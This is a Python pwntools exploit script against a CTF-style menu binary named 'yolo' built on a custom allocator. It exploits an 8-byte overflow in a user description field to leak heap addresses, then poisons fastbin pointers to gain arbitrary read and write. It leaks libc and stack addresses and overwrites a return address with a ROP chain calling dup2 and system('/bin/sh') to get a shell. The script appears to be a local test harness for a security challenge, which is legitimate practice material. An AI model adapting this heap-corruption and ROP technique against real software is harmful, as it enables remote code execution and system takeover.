from pwn import *

FLAG = 'thisiflag'
binary_path = './yolo'
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'

HOST = 'localhost'
PORT = 3647


def create_flag():
    f = open('./flag', 'w')
    f.write(FLAG)
    f.close()


def delete_flag():
    os.system('rm flag')


def exploit():
    def menu():
        return s.recvuntil('->')

    def create(name, password):
        s.send('2\n')
        s.recvuntil('Username: ')
        s.send(name.ljust(15, '\x00'))
        s.recvuntil('Password: ')
        s.send(password.ljust(15, '\x00'))
        return menu()

    def dump():
        s.send('3\n')
        return menu()

    def login(name, password):
        s.send('1\n')
        s.recvuntil('Username: ')
        s.send(name.ljust(0x10, '\x00'))
        s.recvuntil('Password: ')
        s.send(password.ljust(0x10, '\x00'))
        return menu()

    def logout():
        s.send('6\n')
        return menu()

    def add(desc):
        s.send('1\n')
        s.recvuntil('description: ')
        s.send(desc.ljust(0x28, '\x00'))
        return menu()

    def send(name, msg):
        s.send('2\n')
        s.recvuntil('To: ')
        s.send(name.ljust(0x10, '\x00'))
        s.recvuntil('Message: ')
        s.send(msg.ljust(0xd0, '\x00'))
        return menu() 

    def recv(idx):
        s.send('3\n')
        s.recvuntil('Message Id or \'q\' to return to previous menu: ')
        s.send('%d\n' % idx)
        s.send('q\n')
        return menu().split('\nMessage Id ')[0]

    def del_msg(idx):
        s.send('4\n')
        s.send('%d\n' % idx)
        s.send('q\n')
        return menu()

    def del_user():
        s.send('5\n')
        return menu()

    '''
    this binary uses custom heap named 'hjalloc' made by legitbs
    this custom heap grows in reverse order(higher address -> lower address)
    typedef struct smallbin{
        uint64_t size;
        smallbin *fd
        smallbin *bk;
    } smallbin

    typedef struct fastbin{
        fastbin *fd;
        uint64_t junk;
    } fastbin
    '''
    target_process = process(binary_path)

    s = remote(HOST, PORT)
    menu()
    '''
    function add_desc:
    0x0000000000401b6b <+54>:	lea    rsi,[rax+0xb0]
    0x0000000000401b72 <+61>:	mov    eax,DWORD PTR [rbp-0x14]
    0x0000000000401b75 <+64>:	mov    ecx,0xa
    0x0000000000401b7a <+69>:	mov    edx,0x28
    0x0000000000401b7f <+74>:	mov    edi,eax
    0x0000000000401b81 <+76>:	call   0x402986 <recv_until>

    typedef struct User_t
    {
        uint64_t junk;
        char name[0x10];
        char pass[0x10];
        uint32_t id;
        uint32_t msg_cnt;
        pmess msgs[0x10];
        char description[0x20];
    } user, *puser;

    description's size is 0x20, but recv_until for 0x28 bytes. 8bytes overflow
    '''
    create('A', 'A')
    create('B', 'B')
    login('B', 'B')

    # even there's no null terminated, leak some heap pointer
    add('B' * 0x28)
    logout()

    leaked = u64(dump().split('B' * 0x28)[1].split('\n')[0].ljust(8, '\x00'))
    heap_base = leaked - 0xa6b0

    login('B', 'B')
    
    # make message structure(=0x28)
    send('B', 'B')
    logout()
    
    # make user_list structure(=0x18), user structure(=0xd0)
    create('C', 'C')
    login('B', 'B')

    # send 2 more messages for free space
    send('B', 'B')
    send('B', 'B')

    del_msg(3)
    del_msg(2)

    # now first message structure in unsorted bin
    del_msg(1)
    logout()

    login('C', 'C')
    del_user()

    # now D's user structure stick with first message structure
    create('D', 'D')
    login('D', 'D')


    # trigger by overwritting fastbin chunk's fd
    def read(addr, size=8):
        add('D' * 0x20 + p64(heap_base + 0xa6a0))
        send('D', 'read')
        send('D', p64(addr) + p64(0) + p64(0) + p64(heap_base + 0xa4c0) + p64(heap_base + 0xa6d0))
        leaked = recv(1)[:size]
        del_msg(2)
        del_msg(1)
        return leaked

    def write(addr, data):
        add('D' * 0x20 + p64(addr))
        send('D', 'write')
        send('D', data)
        del_msg(1)


    strlen = 0x605048

    # leak strlen got table
    leaked = u64(read(strlen))
    
    libc = ELF(libc_path)
    libc_base = leaked - libc.symbols['strlen']
    libc.address = libc_base 
    
    binsh = list(libc.search('/bin/sh'))[0]
    stack_leaked = u64(read(libc.symbols['__environ']))
    rip = stack_leaked - 0x1b0

    # search rip
    while True:
        if u64(read(rip)) == 0x401e71:
            break
        rip -= 8

    context.clear(arch='amd64')
    rop = ROP(libc)

    rop.call('dup2', [4, 0])
    rop.call('dup2', [4, 1])
    rop.call('system', [binsh])

    add('D' * 0x20 + p64(rip))
    send('D', 'write')

    # overwrite rip to rop payload
    s.send('2\n')
    s.recvuntil('To: ')
    s.send('D'.ljust(0x10, '\x00'))
    s.recvuntil('Message: ')
    s.send(str(rop).ljust(0xd0, '\x00'))
    s.recvuntil('Message sent\n\n')

    s.send('cat flag\n')
    flag = s.recv(1024)
    target_process.close()

    if FLAG in flag:
        return 1
    else:
        return 0


if __name__ == '__main__':
    create_flag()
    if exploit():
        print '[+] exploit success!'
    else:
        print '[-] exploit failed!'
    delete_flag()

